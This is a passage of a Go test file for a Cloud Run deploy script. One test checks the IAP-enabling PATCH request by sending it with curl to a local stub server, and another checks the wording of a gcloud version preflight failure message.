}

// ---------------------------------------------------------------------------
// IAP PATCH — verify actual HTTP request via stub server
// ---------------------------------------------------------------------------

func TestScriptEnableIAPPatchBodyViaStubServer(t *testing.T) {
	var capturedBody []byte
	var capturedURL string
	var capturedMethod string
	var capturedContentType string

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedMethod = r.Method
		capturedURL = r.URL.String()
		capturedContentType = r.Header.Get("Content-Type")
		body, err := io.ReadAll(r.Body)
		if err == nil {
			capturedBody = body
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{}`))
	}))
	defer server.Close()

	// Call the stub server with the same body and URL structure deploy.sh uses
	patchBody, _, _ := runBashFunc(t, "di_iap_patch_body")
	patchBody = strings.TrimSpace(patchBody)

	// Use curl to send the PATCH to our stub server — mirrors what deploy.sh does
	bashCmd := fmt.Sprintf(`curl -s -o /dev/null -w "%%{http_code}" \
		-X PATCH \
		-H "Authorization: Bearer fake-token" \
		-H "Content-Type: application/json" \
		-d '%s' \
		"%s?updateMask=iapEnabled,invokerIamDisabled"`, patchBody, server.URL)

	cmd := exec.Command("bash", "-c", bashCmd)
	out, err := cmd.Output()
	require.NoError(t, err, "curl to stub server failed")
	assert.Equal(t, "200", strings.TrimSpace(string(out)))

	// Verify the request
	assert.Equal(t, "PATCH", capturedMethod)
	assert.Equal(t, "application/json", capturedContentType)
	assert.Contains(t, capturedURL, "updateMask=iapEnabled,invokerIamDisabled")
	assert.Contains(t, string(capturedBody), `"iapEnabled":true`)
	assert.Contains(t, string(capturedBody), `"invokerIamDisabled":true`)
}

// ---------------------------------------------------------------------------
// Preflight: gcloud capability check
// ---------------------------------------------------------------------------

func TestScriptCheckGcloudInstances_FailureMessage(t *testing.T) {
	// On this container (gcloud 575.0.0), the preflight SHOULD fail.
	// On a container with gcloud 582+, skip this test.
	_, stderr, exitCode := runBashFunc(t, "di_check_gcloud_instances")

	if exitCode == 0 {
		t.Skip("gcloud beta run instances is available — cannot test failure path")
	}

	assert.Equal(t, 1, exitCode)
	assert.Contains(t, stderr, "gcloud beta run instances")
	assert.Contains(t, stderr, "575.0.0")
	assert.Contains(t, stderr, "582.0.0")
	assert.Contains(t, stderr, "gcloud components update")
	assert.Contains(t, stderr, "DO NOT use 'gcloud alpha run instances'")
	assert.Contains(t, stderr, "--sandbox-launcher")
}
